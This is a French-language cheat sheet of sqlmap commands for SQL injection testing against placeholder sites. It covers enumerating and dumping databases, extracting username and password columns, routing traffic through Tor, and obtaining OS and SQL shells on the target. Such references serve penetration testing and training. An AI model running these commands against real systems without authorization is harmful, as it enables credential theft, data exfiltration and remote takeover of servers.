## Cheat sheet
Commandes automatiques
Scanner une url de manière automatique

sqlmap -u "http://siteatester.fr"

Scanner une url avec un paramètre GET

sqlmap -u "http://siteatester.fr?id=1"

Scanner une url avec des paramètres POST

sqlmap -u "http://siteatester.fr" --data=PARAMETRE1=VALEUR1&PARAMETRE2=VALEUR2

Préciser les paramètres
Préciser le paramètre sur lequel réaliser l’injection

sqlmap -u "http://siteatester.fr?param1=valueur1&param2=valueur2” -p param1

Préciser le type de base de données (mysql)

sqlmap -u "http://siteatester.fr" --dbms=mysql

Listage
Lister les bases de données

sqlmap -u "http://siteatester.fr?id=1" --dbs

Lister les tables d’une base spécifique

sqlmap -u "http://siteatester.fr" -D "nom_de_la_database" --tables

Lister les colonnes d’une table spécifique

sqlmap -u "http://siteatester.fr" -D "nom_de_la_database" -T "nom_de_la_table" --columns

Dump
Dump tout ce qu’SQLMap trouve

sqlmap -u "http://siteatester.fr" --dump

Dump une base de données spécifique

sqlmap -u "http://siteatester.fr" -D "nom_de_la_database" --dump

Dump une table spécifique

sqlmap -u "http://siteatester.fr" -D "nom_de_la_database" -T "nom_de_la_table" --dump

Dump seulement des colonnes spécifiques d’une table

sqlmap -u "http://testsite.com/login.php" -D site_db -T users -C username,password --dump

Cookies
Utiliser des cookies dans la requête

sqlmap -u "http://siteatester.fr" --cookie="COOKIE1=VALEUR1;COOKIE2=VALEUR2"

Proxy
Passer le trafic de SQLMap via un proxy

sqlmap -u "http://siteatester.fr" --proxy=http://proxy:port

Passer le trafic de SQLMap via Tor

sqlmap -u "http://siteatester.fr" --tor --tor-type=SOCKS5 --check-tor

Reverse Shell
Obtenir un reverse shell OS

sqlmap -u "http://siteatester.fr" --os-shell

Obtenir un shell SQL

sqlmap -u "http://siteatester.fr" --sql-shell
